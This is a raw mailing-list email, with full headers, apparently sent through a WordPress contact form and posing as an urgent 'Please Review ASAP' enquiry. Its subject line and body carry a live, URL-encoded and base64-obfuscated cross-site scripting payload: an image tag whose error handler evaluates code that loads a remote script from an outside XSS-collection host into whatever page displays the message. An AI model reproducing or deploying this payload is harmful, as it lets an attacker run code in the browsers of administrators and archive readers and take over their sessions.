Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id UII1NJ++hGnG4wMAu9opvQ
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	for <lists+industrypack-devel@lfdr.de>; Thu, 05 Feb 2026 17:00:31 +0100
X-Original-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id AA304F4E5E
	for <lists+industrypack-devel@lfdr.de>; Thu, 05 Feb 2026 17:00:30 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:From:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=Mi3caOCSkM68UWutcs+LOcQkup5pfQxOoIUbxZtlUHk=; b=JheBojit34i5kLzdJMRbbCU+O4
	RFCgHQZX7iDx23JV7IurQyjC1WSwQ+IVuMJI5BKyScb7IIbc8nAXR7G19Otrrz4ZcbO2KxvSHG9er
	yFHZlNaArPVjoyclDessiDfK/U4RwYmgsCqStFC8BICg9f2h4pwVopqE0HftPJC5b6XA=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1vo1mO-0006Pu-51
	for lists+industrypack-devel@lfdr.de;
	Thu, 05 Feb 2026 16:00:28 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <ID19722282@hlpi1ws-c332s02.ad.aruba.it>)
 id 1vo1mK-0006PW-JW for industrypack-devel@lists.sourceforge.net;
 Thu, 05 Feb 2026 16:00:26 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Reply-To:From:
 Date:Subject:To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=M/fXRoeRBKqnNnjjAueSJmSdAvlkJQnoDjFsLWvW7vE=; b=UyO5LKx0ziy/u7VKOF7yZmCil4
 JZhmfrUlkz0jrHEtYsnr2x0PQAWyIH9l8VfXQ0w2ki4ikgcD9PZY2fu6syqoMRd/Bok5ibH0GND7Z
 tspo/vBjIZ8pZHTiVlJGmbsGLWIqYfCl7BuLIiHdbz17gbUQpBeP2fJxj7LBBo0lyXxU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Reply-To:From:Date:Subject:To:Sender
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=M/fXRoeRBKqnNnjjAueSJmSdAvlkJQnoDjFsLWvW7vE=; b=i
 LDbiNfovOaiCQtAoK7OQnUTHb2kmDy9g10PRf0HNJIt7T9GdIJveSdk4BAAsjf/UjPczXP/kbwegF
 94D6edWPXTgp4NPOXhzHhOu5+zDAHc0hmMcdBZz07Vi5YZJ1Hq1rhrGyZ+Mcvsj8uOBjj/05nCsDc
 C3iv76to6gZL66oA=;
Received: from smartdh01-2.aruba.it ([62.149.158.89])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vo1mJ-0005kX-RX for industrypack-devel@lists.sourceforge.net;
 Thu, 05 Feb 2026 16:00:25 +0000
Received: from hlpi1ws-c332s02.ad.aruba.it ([31.11.36.101])
 by bizsmtp with ESMTP
 id o1m7vdRUEr0hHo1m7v9bqb; Thu, 05 Feb 2026 17:00:11 +0100
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=assobed.it; s=a1;
 t=1770307211; bh=M/fXRoeRBKqnNnjjAueSJmSdAvlkJQnoDjFsLWvW7vE=;
 h=To:Subject:Date:From:MIME-Version:Content-Type;
 b=NjzLu6FNp/SJTfZ3gtNrIHBTgqKirZmwxngPILRSLtotri1sym4cuClEWkYQgNDGO
 /uSpBj/nZPCDc2w2Ev4uaGEyR5GqLxmUMagiWFWNsNAgbVoAImpvJ8u902D3/PPjeD
 CkhXndR9LYggb4YfHSxJAJJR4RiTmLAggHuYLfyKeNFG335E7qSU15on9t+kHi4Hoe
 VuBut/UMXzpumqNrtKTUz/Tp0JRdJrMP1Bms3/jTWcU0w+75AwqFkL41ugYQ64F4ci
 U7R3ZvfgToG6w5HKXuT9RVv33TEmBaXWnWNg0+WBu8en3AvnN4mEhx02qLo6ERbV+5
 qE1FVw7tQjKHQ==
Received: by hlpi1ws-c332s02.ad.aruba.it (Postfix, from userid 19722282)
 id E95E8EB328; Thu,  5 Feb 2026 12:12:35 +0100 (CET)
To: industrypack-devel@lists.sourceforge.net
X-PHP-Originating-Script: 19722282:PHPMailer.php
Date: Thu, 5 Feb 2026 11:12:35 +0000
From: WordPress <wordpress@assobed.it>
Message-ID: <I9ETMuSNgprClVUzvEi1tXklQIgXWbalOcuNwms4AIU@www.assobed.it>
X-Mailer: PHPMailer 7.0.0 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
X-CMAE-Envelope: MS4xfGkiWWYJ0SGV4b48hKDdvtQJ2bDu+KOiM+OZUgdDRmG5a/r5uWN4qHyKaE+TEQ0DkXTlfwrHHn+uteZl9lNXHwBzKp1IkXDm1Ds48Iqkr2HA4THAWTV9
 3lo9Zdlyf1U7zW98DR+wK+oYQmpjn9csie0qLgSIJkuLfQ16osybFyrklbwTJg+Tij6j+DW2EygdOH5M9Crz2dZEPXXAmcm/j/cwnsvNjnpaN9hLzWEiv5G2
 4ytgPA27Z0E1bdGrMBVm1w==
X-Spam-Score: 3.5 (+++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Name: Email: admin@www.assobed.it Message: Please Review ASAP
 %2522%253E%253Cimg%2520src%253Dx%2520id%253DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RyYW
 [...] Content analysis details:   (3.5 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [62.149.158.89 listed in wl.mailspike.net]
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 1.1 DATE_IN_PAST_03_06     Date: is 3 to 6 hours before Received: date
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 TVD_SPACE_RATIO        No description available.
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 1.7 PHP_ORIG_SCRIPT        Sent by bot & other signs
X-Headers-End: 1vo1mJ-0005kX-RX
Subject: [Industrypack-devel] Please Review ASAP
 %22%3E%3Cimg%20src%3Dx%20id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RyYWdvbjAwMS9zY3JpcHQuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror%3Deval%28atob%28this.id%29%29%3E
 enquiry
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: admin@www.assobed.it
Content-Type: multipart/mixed; boundary="===============9107020419860229994=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [2.47 / 15.00];
	LONG_SUBJ(2.08)[277];
	WWW_DOT_DOMAIN(0.50)[];
	MID_RHS_WWW(0.50)[];
	R_DKIM_ALLOW(-0.20)[lists.sourceforge.net:s=beta];
	MAILLIST(-0.20)[mailman];
	R_SPF_ALLOW(-0.20)[+ip4:216.105.38.7];
	DMARC_POLICY_SOFTFAIL(0.10)[assobed.it : SPF not aligned (relaxed), DKIM not aligned (relaxed),none];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	DKIM_MIXED(0.00)[];
	HAS_PHPMAILER_SIG(0.00)[];
	FORGED_SENDER_MAILLIST(0.00)[];
	RECEIVED_HELO_LOCALHOST(0.00)[];
	R_DKIM_REJECT(0.00)[sourceforge.net:s=x,sf.net:s=x,assobed.it:s=a1];
	ARC_NA(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+,1:~,2:+,3:+];
	RCPT_COUNT_ONE(0.00)[1];
	REPLYTO_DOM_NEQ_FROM_DOM(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	REPLYTO_DOM_NEQ_TO_DOM(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	TO_DN_NONE(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[wordpress@assobed.it,industrypack-devel-bounces@lists.sourceforge.net];
	FROM_HAS_DN(0.00)[];
	DKIM_TRACE(0.00)[lists.sourceforge.net:+,sourceforge.net:-,sf.net:-,assobed.it:-];
	HAS_X_POS(0.00)[];
	MID_RHS_MATCH_FROMTLD(0.00)[];
	HAS_REPLYTO(0.00)[admin@www.assobed.it];
	NEURAL_HAM(-0.00)[-1.000];
	ASN(0.00)[asn:11320, ipnet:216.105.32.0/21, country:US];
	TAGGED_RCPT(0.00)[industrypack-devel];
	DBL_BLOCKED_OPENRESOLVER(0.00)[lists.sourceforge.net:dkim,lists.sourceforge.net:helo,lists.sourceforge.net:rdns,www.assobed.it:mid,www.assobed.it:replyto]
X-Rspamd-Queue-Id: AA304F4E5E
X-Rspamd-Action: no action

--===============9107020419860229994==
Content-Type: text/html; charset=UTF-8

Name: <br/>Email: admin@www.assobed.it<br/>Message: Please Review ASAP %2522%253E%253Cimg%2520src%253Dx%2520id%253DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RyYWdvbjAwMS9zY3JpcHQuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%2520onerror%253Deval%2528atob%2528this.id%2529%2529%253E<br/>



--===============9107020419860229994==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============9107020419860229994==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============9107020419860229994==--
